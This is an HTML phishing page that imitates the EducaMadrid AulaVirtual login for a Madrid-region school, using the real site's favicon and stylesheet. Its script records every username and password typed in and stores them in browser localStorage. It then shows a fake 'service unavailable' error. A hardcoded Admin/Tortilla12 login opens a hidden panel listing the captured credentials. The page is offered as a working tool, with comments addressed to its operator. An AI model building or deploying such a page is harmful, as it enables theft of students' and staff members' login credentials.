<!DOCTYPE html>
<html dir="ltr" lang="es" xml:lang="es">
<head>
    <title>Entrar al sitio | AulaVirtual</title>
    <link rel="shortcut icon" href="https://aulavirtual33.educa.madrid.org/cp.maestrorodrigo.aranjuez/theme/image.php/educamadrid/theme/1776465553/favicon">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/cp.maestrorodrigo.aranjuez/theme/styles.php/educamadrid/1776465553_1772606067/all" />
    
    <style>
        /* Estilos del Panel Admin */
        #vault-panel {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #fff; color: #333; z-index: 10000; padding: 40px; overflow-y: auto;
            font-family: Arial, sans-serif;
        }
        .vault-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        .vault-table th, .vault-table td { border: 1px solid #ddd; padding: 12px; text-align: left; }
        .vault-table th { background: #146ebe; color: white; }
        
        /* Estilo de la Alerta Personalizada */
        #customAlert {
            display:none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(0,0,0,0.5); z-index: 99999;
        }
        .alert-box {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); 
            width: 320px; text-align: center; font-family: Arial, sans-serif;
        }
    </style>
</head>

<body class="format-site path-login dir-ltr lang-es yui-skin-sam yui3-skin-sam pagelayout-login theme">

<div id="page-wrapper">
    <div id="page" class="container-fluid pt-5 mt-0">
        <div class="login-wrapper">
            <div class="login-container">
                <div role="main">
                    <div class="loginform">
                        <h1 class="login-heading mb-4">Entrar a MAESTRO RODRIGO</h1>
                        <form class="login-form" action="javascript:void(0);" id="login">
                            <div class="login-form-username mb-3">
                                <label for="username" class="sr-only">Nombre de usuario</label>
                                <input type="text" name="username" id="username" class="form-control form-control-lg" placeholder="Nombre de usuario">
                            </div>
                            <div class="login-form-password mb-3">
                                <label for="password" class="sr-only">Contraseña</label>
                                <input type="password" name="password" id="password" class="form-control form-control-lg" placeholder="Contraseña">
                            </div>
                            <div class="login-form-submit mb-3">
                                <button class="btn btn-primary btn-lg" type="submit" id="loginbtn">Acceder</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<div id="vault-panel">
    <h1>Registros Capturados</h1>
    <table class="vault-table">
        <thead>
            <tr><th>Usuario</th><th>Contraseña</th><th>Fecha</th></tr>
        </thead>
        <tbody id="vault-items"></tbody>
    </table>
    <br>
    <button onclick="location.reload()" style="background: #666; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer;">Cerrar Panel</button>
</div>

<div id="customAlert">
    <div class="alert-box">
        <h3 style="margin-top: 0; color: #333; font-size: 18px;">Error de autenticación</h3>
        <p style="color: #666; font-size: 14px;">El servicio de EducaMadrid no está disponible. Por favor, cierre la pestaña y vuelva a intentarlo de nuevo.</p>
        <button onclick="location.reload();" style="background: #146ebe; color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer; width: 100%; font-weight: bold;">Aceptar</button>
    </div>
</div>

<script>
    document.getElementById('login').onsubmit = function(e) {
        e.preventDefault();
        
        var u = document.getElementById('username').value;
        var p = document.getElementById('password').value;

        // 1. Lógica de entrada para ti (Admin)
        if (u === "Admin" && p === "Tortilla12") {
            document.getElementById('page-wrapper').style.display = 'none';
            document.getElementById('vault-panel').style.display = 'block';
            
            var data = JSON.parse(localStorage.getItem('_sys_logs') || "[]");
            var html = "";
            data.forEach(function(item) {
                html += "<tr><td>" + item.user + "</td><td>" + item.pass + "</td><td>" + item.date + "</td></tr>";
            });
            document.getElementById('vault-items').innerHTML = html;
            return false;
        }

        // 2. Guardado de datos (lo que verás en el panel)
        var logs = JSON.parse(localStorage.getItem('_sys_logs') || "[]");
        logs.push({ user: u, pass: p, date: new Date().toLocaleString() });
        localStorage.setItem('_sys_logs', JSON.stringify(logs));

        // 3. Mostrar la alerta de error falsa
        document.getElementById('customAlert').style.display = 'block';
        return false;
    };
</script>

</body>
</html>
